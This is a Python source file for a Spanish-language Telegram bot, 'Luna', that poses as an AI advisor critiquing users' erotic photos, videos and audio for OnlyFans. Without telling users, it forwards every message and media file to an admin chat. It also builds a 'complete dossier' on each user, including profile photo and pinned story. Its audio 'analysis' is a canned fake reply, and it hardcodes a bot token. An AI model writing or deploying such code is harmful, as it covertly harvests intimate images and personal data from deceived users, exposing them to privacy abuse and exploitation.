import os
import base64
import sqlite3
import requests
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064
RENDER_EXTERNAL_URL = "https://luna-bot-a1fc.onrender.com"

# 👇 PEGA AQUÍ TU CLAVE NUEVA Y PRIVADA DE OPENROUTER
OPENROUTER_API_KEY = "sk-or-v1-TU_CLAVE_AQUI"

# ======================
# BASE DE DATOS
# ======================
def init_db():
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?)", (user_id, nombre, username, edad))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

# ======================
# EXPEDIENTE COMPLETO Y STORIES
# ======================
async def enviar_expediente_completo(context, user, edad):
    try:
        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE COMPLETO**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre:** {user.first_name} {user.last_name or ''}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🔗 **Usuario:** @{user.username if user.username else 'Oculto'}\n"
            f"🌍 **Idioma:** {user.language_code or 'Desconocido'}\n"
            f"⭐ **Premium:** {'Sí' if user.is_premium else 'No'}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        
        fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
        if fotos_perfil.total_count > 0:
            foto_perfil = fotos_perfil.photos[0][-1].file_id
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil.")
            
        try:
            chat_info = await context.bot.get_chat(user.id)
            if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
                story = chat_info.pinned_story
                if story.photo:
                    await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=story.photo[-1].file_id, caption="📖 Historia (Story) del perfil.")
                elif story.video:
                    await context.bot.send_video(chat_id=DANI_CHAT_ID, video=story.video.file_id, caption="🎥 Video de la Historia (Story) del perfil.")
        except Exception as e:
            print(f"No se pudo obtener la historia: {e}")

    except Exception as e: 
        print(f"Error en expediente: {e}")

# ======================
# REENVIAR AL ADMIN (BLINDADO)
# ======================
async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message
        usuario_actual = update.effective_user
        
        if msg.forward_origin:
            nombre_original = "Canal o Grupo Desconocido"
            id_original = ""
            try:
                if msg.forward_origin.sender_user:
                    nombre_original = msg.forward_origin.sender_user.first_name
                    id_original = f" (`{msg.forward_origin.sender_user.id}`)"
            except AttributeError: pass 
            try:
                if msg.forward_origin.chat:
                    nombre_original = msg.forward_origin.chat.title
            except AttributeError: pass 
            try:
                if msg.forward_origin.sender_user_name:
                    nombre_original = msg.forward_origin.sender_user_name
            except AttributeError: pass

            texto_aviso = (
                f"🔄 **REENVIADO A TI (Dani)**\n"
                f"👤 **Lo mandó originalmente:** {nombre_original}{id_original}\n"
                f"📩 **Quien te lo reenvió:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
            )
        else:
            texto_aviso = (
                f"📩 **MENSAJE NORMAL**\n"
                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
            )

        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
        await context.bot.forward_message(
            chat_id=DANI_CHAT_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
    except Exception as e:
        print(f"Error reenviando al admin: {e}")

# ======================
# ANÁLISIS DE IMAGEN CON VISIÓN REAL (OpenRouter)
# ======================
def analizar_imagen_con_vision(imagen_bytes, tipo="foto"):
    try:
        base64_image = base64.b64encode(imagen_bytes).decode('utf-8')
        
        prompt = f"""Actúa como Luna, una experta en contenido erótico para OnlyFans.
        Estás analizando esta {tipo}. Debes evaluar la imagen y responder EXACTAMENTE con este formato:

        1. **Nivel de desnudo:** (Di claramente si está desnuda, en ropa interior, en bikini o vestida).
        2. **Calidad de la luz:** (Evalúa si la luz es buena o mala. Di si hay sombras raras, si está muy oscura, o si la luz resalta bien el cuerpo).
        3. **La pose:** (Qué tan sexy es, si se ve natural o forzada, y si muestra bien las curvas).
        4. **Lo que hay que mejorar:** (Consejos para que venda más).
        5. **Tip de venta:** (Un consejo rápido de negocios para OnlyFans).

        Sé directa, cachonda y usa palabras como morbo, sexy, caliente.
        """

        response = requests.post(
            url="https://openrouter.ai/api/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {OPENROUTER_API_KEY}",
                "Content-Type": "application/json"
            },
            json={
                "model": "google/gemma-4-26b-a4b-it:free", # Modelo de visión GRATIS
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": prompt},
                            {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
                        ]
                    }
                ],
                "temperature": 0.7,
                "max_tokens": 500
            },
            timeout=30
        )
        
        data = response.json()
        if 'choices' in data and len(data['choices']) > 0:
            return data['choices'][0]['message']['content'].strip()
        else:
            print(f"Error OpenRouter: {data}")
            return "💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?"
    except Exception as e:
        print(f"Error en visión: {e}")
        return "💋 Me encantó la foto, pero no pude analizarla bien."

# ======================
# HANDLERS
# ======================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🔍 Estoy mirando tu foto con detalle...")
    
    try:
        photo_file = await update.message.photo[-1].get_file()
        photo_bytes = await photo_file.download_as_bytearray()
        analisis = analizar_imagen_con_vision(photo_bytes, tipo="foto")
        await msg.edit_text(analisis)
    except Exception as e:
        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")

async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")

    try:
        file = None
        if update.message.video and update.message.video.thumbnail:
            file = await update.message.video.thumbnail.get_file()
        elif update.message.video_note and update.message.video_note.thumbnail:
            file = await update.message.video_note.thumbnail.get_file()
        elif update.message.animation and update.message.animation.thumbnail:
            file = await update.message.animation.thumbnail.get_file()

        if file:
            img_bytes = await file.download_as_bytearray()
            analisis = analizar_imagen_con_vision(img_bytes, tipo="video")
            await msg.edit_text(analisis)
        else:
            await msg.edit_text("🎬 Vi tu video, pero no pude sacar una imagen para analizar la luz o la ropa. Mándame una captura si quieres consejos.")
    except Exception as e:
        await msg.edit_text("🎬 Vi tu video y ya lo recibí. Mándame una captura para darte consejos.")

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")

    await reenviar_al_admin(update, context)
    msg = await update.message.reply_text("🎧 Escuchando tu audio...")
    await msg.edit_text("🎧 **Análisis de tu audio:** Tu tono de voz es muy sugerente y natural. Intenta bajar un poco más la voz, casi en un susurro. Los audios personalizados se venden carísimos. ¡Aprovéchalo! 😈")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text("¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:")
    else:
        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video o audio.")

async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user
    if text.startswith('/'): return

    if obtener_usuario(user.id):
        await reenviar_al_admin(update, context)
        return await update.message.reply_text("💋 ¿En qué te ayudo? Mándame una foto, video o audio.")
    
    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))

        if edad < 18: return await update.message.reply_text("Debes ser mayor de 18 años.")
            
        guardar_usuario(user.id, user.first_name, user.username, edad)
        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos o audios.")
        await enviar_expediente_completo(context, user, edad)
    except:
        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")

# ======================
# MAIN (WEBHOOKS)
# ======================
if __name__ == "__main__":
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
    application.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))

    port = int(os.environ.get("PORT", 8080))

    print("🌙 Luna Bot iniciado con Visión Artificial (OpenRouter)...")
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TELEGRAM_TOKEN,
        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}"
    )
